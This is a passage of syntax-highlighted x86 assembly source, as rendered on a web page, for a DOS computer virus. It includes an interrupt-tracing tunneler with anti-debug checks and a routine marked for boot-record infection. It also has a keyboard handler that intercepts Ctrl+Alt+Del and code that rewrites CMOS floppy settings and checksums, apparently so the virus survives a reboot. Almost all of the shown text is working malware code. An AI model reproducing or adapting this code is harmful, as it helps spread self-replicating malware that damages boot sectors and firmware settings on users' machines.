 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Patch it!</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Rand16</span><span class="sc4">:</span><span class="sc0">                        
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">
 </span><span class="sc5">setalc</span><span class="sc0">                        </span><span class="sc1">; Counter 0, latch it with zero detection</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Port 0043h, 8253-4 = PIT mode control word</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; Delay for Intel Chipset 8237IB ???</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Obtain a byte from counter 0</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E724h</span><span class="sc0">

</span><span class="sc5">Seed_01</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4E6Dh</span><span class="sc0">               </span><span class="sc1">; Poorly made, as far as Your eyes can see</span><span class="sc0">

</span><span class="sc5">Seed_02</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">71AAh</span><span class="sc0">

</span><span class="sc5">Seed_03</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

 </span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seed_01</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seed_02</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; Bahhh...</span><span class="sc0">
 </span><span class="sc6">sal</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seed_03</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">sahf</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Ranger</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Random in range</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; DX:AX / CX</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 01h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Tracer</span><span class="sc4">:</span><span class="sc0">                        
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push everything</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                  
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Don't trace My codes! 8-)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Branch</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load pointer to next instruction (return address)</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Fray</span><span class="sc0">                   </span><span class="sc1">; Was there a PUSHF ? branch if not</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore tunneling counter</span><span class="sc0">

</span><span class="sc5">Fray</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Tunneling counter</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Extraction</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">                 </span><span class="sc1">; PUSHF instruction?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Extortion</span><span class="sc0">              
 </span><span class="sc6">not</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; We'll alter stack on next execution</span><span class="sc0">

</span><span class="sc5">Extortion</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; It ain't likely that a DOS dispatcher handler</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; will PUSHF and then POPF, but anyway... 8-)</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Branch</span><span class="sc0">                 
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">Branch</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Extraction</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; So now it's the right time to re-swap DOS</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">                </span><span class="sc1">; Clear TF</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Swapper</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load old tracer vector</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Restore INT 01h handler</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Freeware</span><span class="sc0">               </span><span class="sc1">; Allow boot-record infection</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Restore_IRQs</span><span class="sc0">           </span><span class="sc1">; Restore PIC 1 state</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc0">

</span><span class="sc5">IIO</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; Restore PIC 2 state</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Branch</span><span class="sc0">

</span><span class="sc5">Metrics</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; INT 09h patcher</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Keyboard</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load address of INT 09h vector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Prebuff</span><span class="sc0">      </span><span class="sc1">; DI = 5 bytes buffer </span><span class="sc0">

</span><span class="sc5">Exposure</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">Exchanging</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; Exchange CX bytes</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Exchanging</span><span class="sc0">

</span><span class="sc5">Unpressed</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 09h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Survive</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; This is the 1st handler (installed on booting)</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFCh</span><span class="sc0">              
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Offshoot</span><span class="sc0">               </span><span class="sc1">; Call the main routine of INT 09h handler</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">Keypress</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; Pass control back to INT 09h</span><span class="sc0">

</span><span class="sc5">Keyboard</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0F000E987h</span><span class="sc0">

</span><span class="sc5">Grip</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; And this is the 2nd handler (file execution)</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push registers</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Metrics</span><span class="sc0">                </span><span class="sc1">; Restore the first 5 bytes of INT 09h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Offshoot</span><span class="sc0">               </span><span class="sc1">; Call the main routine of INT 09h handler</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Keypress</span><span class="sc0">               </span><span class="sc1">; Call original INT 09h then</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Metrics</span><span class="sc0">                </span><span class="sc1">; Put again the far JMP</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Branch</span><span class="sc0">

</span><span class="sc5">Offshoot</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Main routine of INT 09h handler</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F828h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Survive</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Grip</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0417h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get keyboard status flags 1</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                 </span><span class="sc1">; Test bit 2 &amp; 3, i.e. Ctrl &amp; Alt state</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                 </span><span class="sc1">; Pressed simultaneously?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unpressed</span><span class="sc0">              </span><span class="sc1">; Jump if not</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">; Port 0060h = keyboard controller</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">                 </span><span class="sc1">; Get scan code, is it a DEL ??</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Unpressed</span><span class="sc0">

</span><span class="sc5">Collide</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0475h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">          </span><span class="sc1">; (0000h:0475h) number of installed HD</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Unpressed</span><span class="sc0">              </span><span class="sc1">; Jump if HD is unavailable</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Enable/disable FDDs in CMOS ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Enable_FDD</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; CMOS RAM index 10h = floppy drive type</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Save it on stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">                 </span><span class="sc1">; CMOS RAM index 2Eh = hi-byte of IBM standard </span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">;                      CMOS checksum</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                 </span><span class="sc1">; CMOS RAM index 2Fh = low-byte of IBM standard</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">;                      CMOS checksum</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">

</span><span class="sc5">Calculate</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Checksum method for IBM standard</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Calculate</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">PS_2</span><span class="sc0">                   </span><span class="sc1">; If checksum differs, probably IBM PS/2 CMOS</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2F2Eh</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Platitude</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Correct CMOS checksum</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Disable_FDD</span><span class="sc0">

</span><span class="sc5">Platitude</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Disable_FDD</span><span class="sc0">

</span><span class="sc5">PS_2</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; Get IBM PS/2 CMOS CRC-16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Stable</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Stable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3233h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">                 </span><span class="sc1">; Obtain hi-byte CRC-16</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
